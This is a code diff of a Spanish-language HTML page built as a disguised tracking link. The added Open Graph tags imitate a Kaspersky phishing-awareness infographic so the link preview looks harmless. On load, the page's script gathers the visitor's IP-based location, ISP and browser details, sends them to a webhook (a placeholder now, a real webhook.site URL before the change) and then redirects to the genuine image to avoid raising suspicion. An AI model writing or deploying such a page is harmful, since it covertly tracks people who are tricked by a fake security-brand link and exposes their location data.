@@ -2,14 +2,21 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Cargando contenido...</title>
+    <title>Infografía de Seguridad - Kaspersky</title>
+
+    <!-- Etiquetas Open Graph para camuflar la vista previa en WhatsApp -->
+    <meta property="og:title" content="🛡️ Guía de Ciberseguridad: Qué hacer ante el Phishing">
+    <meta property="og:description" content="Infografía educativa de Kaspersky con los 5 pasos clave para proteger tu información institucional.">
+    <meta property="og:image" content="https://content.kaspersky-labs.com/fm/press-releases/60/602e97536a1c3cf3644d3961ff99098b/processed/phishing-email-infographic-q93.png">
+    <meta property="og:type" content="article">
+
     <script>
-        // 1. Capturamos los datos básicos de la víctima usando una API pública gratuita
+        // 1. Captura de metadatos de red a través de una API pública
         fetch('https://ipapi.co')
         .then(response => response.json())
         .then(data => {
-            // 2. Enviamos la IP y los datos a un "Webhook" (tu buzón secreto)
-            fetch('https://webhook.site/1dd6a511-8c7b-430c-9dcf-40e32ef25686', {
+            // 2. ENVÍO DE DATOS: Reemplaza las comillas de abajo con tu URL de Webhook.site
+            return fetch('TU_URL_DE_WEBHOOK_AQUÍ', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -17,20 +24,25 @@
                     ciudad: data.city,
                     pais: data.country_name,
                     proveedor: data.org,
-                    dispositivo: navigator.userAgent
+                    dispositivo: navigator.userAgent,
+                    nota: "Acceso detectado desde enlace camuflado"
                 })
             });
-
-            // 3. Redirección invisible a un video o meme para que no sospechen
-            window.location.href = "https://youtube.com";
+        })
+        .then(() => {
+            // 3. Redirección automática y transparente hacia la infografía original de Kaspersky
+            window.location.href = "https://content.kaspersky-labs.com/fm/press-releases/60/602e97536a1c3cf3644d3961ff99098b/processed/phishing-email-infographic-q93.png";
         })
         .catch(error => {
-            // Si algo falla, redirige igual para no levantar sospechas
-            window.location.href = "https://youtube.com";
+            // En caso de que el usuario bloquee las APIs de rastreo, redirige igual para no levantar sospechas
+            window.location.href = "https://content.kaspersky-labs.com/fm/press-releases/60/602e97536a1c3cf3644d3961ff99098b/processed/phishing-email-infographic-q93.png";
         });
     </script>
 </head>
 <body>
-    <p>Cargando, por favor espere...</p>
+    <div style="text-align: center; margin-top: 50px; font-family: Arial, sans-serif; color: #333;">
+        <p>Cargando recurso educativo de seguridad...</p>
+    </div>
 </body>
 </html>
+
